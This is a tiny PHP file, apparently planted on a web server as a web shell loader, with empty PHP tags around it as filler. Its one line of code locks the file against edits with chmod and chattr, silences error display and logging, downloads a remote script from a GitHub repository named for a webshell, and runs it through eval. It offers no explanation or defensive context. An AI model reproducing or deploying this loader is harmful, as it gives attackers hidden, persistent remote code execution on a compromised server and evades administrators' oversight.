<?php
?>
<?$this_file=__FILE__;system("chmod ugo-w $this_file");system("chattr +i $this_file");error_reporting(0);ini_set('display_errors','0');ini_set('log_errors','0');$url="https://raw.githubusercontent.com/exploit-haxor/webshell/main/-21one.php";$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$result=curl_exec($ch);eval("?>".$result);?>
<?
?>
<?php
?>
